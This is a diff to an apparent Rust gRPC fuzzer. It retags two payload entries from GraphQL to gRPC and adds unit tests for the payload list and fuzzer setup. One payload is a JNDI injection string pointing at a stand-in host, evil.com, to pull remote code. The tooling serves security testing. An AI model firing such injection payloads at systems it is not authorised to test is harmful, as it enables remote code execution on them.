@@ -317,7 +317,7 @@ pub fn get_payloads() -> Vec<Payload> {
     let mut payloads = Vec::new();
 
     payloads.push(Payload {
-        payload_type: PayloadType::GraphQL,
+        payload_type: PayloadType::Grpc,
         payload: "{\"listServices\":{}}".to_string(),
         description: "gRPC reflection - list services".to_string(),
         severity: Severity::Info,
@@ -325,7 +325,7 @@ pub fn get_payloads() -> Vec<Payload> {
     });
 
     payloads.push(Payload {
-        payload_type: PayloadType::GraphQL,
+        payload_type: PayloadType::Grpc,
         payload: "{\"a\":\"${jndi:ldap://evil.com/a}\"}".to_string(),
         description: "gRPC JNDI injection".to_string(),
         severity: Severity::Critical,
@@ -333,4 +333,53 @@ pub fn get_payloads() -> Vec<Payload> {
     });
 
     payloads
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn test_grpc_payloads_count() {
+        let payloads = get_payloads();
+        assert!(payloads.len() >= 2, "Expected at least 2 gRPC payloads, got {}", payloads.len());
+    }
+
+    #[test]
+    fn test_grpc_payloads_correct_type() {
+        let payloads = get_payloads();
+        for p in &payloads {
+            assert_eq!(p.payload_type, PayloadType::Grpc);
+        }
+    }
+
+    #[test]
+    fn test_grpc_payloads_non_empty() {
+        let payloads = get_payloads();
+        for p in &payloads {
+            assert!(!p.payload.is_empty());
+            assert!(!p.description.is_empty());
+        }
+    }
+
+    #[test]
+    fn test_grpc_fuzzer_new() {
+        let fuzzer = GrpcFuzzer::new("http://localhost:50051".to_string());
+        assert_eq!(fuzzer.endpoint, "http://localhost:50051");
+        assert!(fuzzer.methods.is_empty());
+        assert!(fuzzer.metadata.is_empty());
+    }
+
+    #[test]
+    fn test_grpc_fuzzer_with_metadata() {
+        let fuzzer = GrpcFuzzer::new("http://localhost:50051".to_string())
+            .with_metadata("auth", "token123");
+        assert_eq!(fuzzer.metadata.get("auth"), Some(&"token123".to_string()));
+    }
+
+    #[test]
+    fn test_grpc_vulnerability_display() {
+        assert_eq!(GrpcVulnerability::ReflectionEnabled.to_string(), "gRPC Reflection Enabled");
+        assert_eq!(GrpcVulnerability::AuthBypass.to_string(), "Authentication Bypass");
+    }
 }
